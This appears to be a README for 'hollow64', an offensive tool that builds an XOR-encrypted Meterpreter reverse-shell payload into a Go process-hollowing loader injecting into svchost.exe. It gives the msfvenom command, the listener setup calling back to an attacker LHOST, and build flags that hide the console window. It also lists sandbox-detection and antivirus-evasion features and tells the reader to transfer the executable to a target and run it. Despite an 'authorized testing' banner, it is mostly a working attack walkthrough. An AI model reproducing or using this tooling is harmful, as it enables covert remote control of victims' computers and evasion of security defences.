## Files

- **[hollow64_template.go](hollow64_template.go)** - Template with placeholder for payload
- **[compile_custom.sh](compile_custom.sh)** - Linux/Kali compiler script

---

## Quick Start

### On Linux/Kali

```bash
chmod +x compile_custom.sh
./compile_custom.sh
```

---

## Usage Walkthrough

### Step 1: Run the Compiler

**Linux:**
```bash
$ ./compile_custom.sh
```

### Step 2: Enter Your Configuration

```
========================================
  Custom hollow64.exe Compiler
  FOR AUTHORIZED TESTING ONLY
========================================

[+] Enter configuration:

LHOST (attacker IP): 192.168.1.100
LPORT (listener port, default 443): 4444

[+] Configuration:
    LHOST: 192.168.1.100
    LPORT: 4444

Confirm? (Y/N): Y
```

### Step 3: Wait for Compilation

```
[+] Generating meterpreter payload...
[+] Payload generated (192.168.1.100:4444)
[+] Encrypting payload with XOR...
[+] Payload encrypted
[+] Converting to Go format...
[+] Creating hollow64.go with embedded payload...
[+] hollow64.go created
[+] Compiling hollow64.exe...
[+] Cleaning up temporary files...

========================================
  SUCCESS!
========================================

  hollow64.exe compiled successfully!

  Configuration:
  - LHOST: 192.168.1.100
  - LPORT: 4444
  - Target: svchost.exe
  - Evasion: Sandbox detection, timing, RW->RX
```

### Step 4: Set Up Listener

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j
```

### Step 5: Deploy and Execute

Transfer `hollow64.exe` to target and run:
```batch
hollow64.exe
```

---

## What The Compiler Does

### 1. Generates Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<YOUR_IP> \
  LPORT=<YOUR_PORT> \
  EXITFUNC=thread \
  -f raw
```

### 2. XOR Encrypts Payload
```
Key: 0xAA
Original: 0xFC 0x48 0x83...
Encrypted: 0x56 0xE2 0x29...
```

### 3. Converts to Go Format
```go
var encryptedPayload = []byte{
    0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42...
}
```

### 4. Embeds in Template
```go
// hollow64_template.go
var encryptedPayload = []byte{PAYLOAD_BYTES}
                                    ↓
// hollow64.go
var encryptedPayload = []byte{0x56, 0xe2, 0x29...}
```

### 5. Compiles
```bash
go build -ldflags="-s -w -H=windowsgui" -o hollow64.exe hollow64.go
```

---

## Compilation Flags Explained

| Flag | Purpose |
|------|---------|
| `-ldflags="-s -w"` | Strip debug symbols (smaller binary) |
| `-H=windowsgui` | No console window (GUI subsystem) |
| `GOOS=windows` | Target Windows OS (for Linux cross-compile) |
| `GOARCH=amd64` | Target x64 architecture |

---

## Features Built Into hollow64.exe

### ✅ Sandbox Detection
- CPU count check (<2 cores = sandbox)
- RAM check (<2GB = sandbox)
- Timing verification (accelerated time = sandbox)
- Exits silently if sandbox detected

### ✅ Stealth Techniques
- **Entry point overwrite** (proven to work!)
- **RW → RX memory protection** (not RWX)
- **svchost.exe** as target (legitimate Windows service)
- **No console window** (CREATE_NO_WINDOW)
- **XOR encrypted payload** (0xAA key)

### ✅ Evasion
- 10 second sleep with timing verification
- Dynamic API resolution
- No static shellcode in binary
- Silent execution

---

